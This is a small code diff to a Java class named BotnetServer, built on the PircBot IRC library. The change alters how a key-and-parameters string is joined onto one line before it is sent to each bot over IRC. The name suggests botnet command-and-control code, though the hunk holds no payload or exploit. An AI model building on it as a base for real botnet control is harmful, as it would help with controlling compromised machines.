@@ -150,9 +150,12 @@ public class BotnetServer extends PircBot {
 				m.setPubParams(info.toString());
 				String stuff = "key " + m.getStrKey() + " " + info.toString();
 				System.out.println(stuff.length() + " " + stuff.split("\n").length);
-				System.out.println("\n\n:" + stuff.replace("\n", " hi ") + ":\n\n");
-				System.out.println("\n\n:" + stuff + ":\n\n");
-				sendMessage(bots[i].getNick(), stuff);
+				String stuff2 = "";
+				for (String s : stuff.split("\n")) {
+					stuff2 += s + " ";
+				}
+				System.out.println("\n\n:" + stuff2 + ":\n\n");
+				sendMessage(bots[i].getNick(), stuff2);
 				botKeys.put(bots[i].getNick(), m);
 			}
 		}
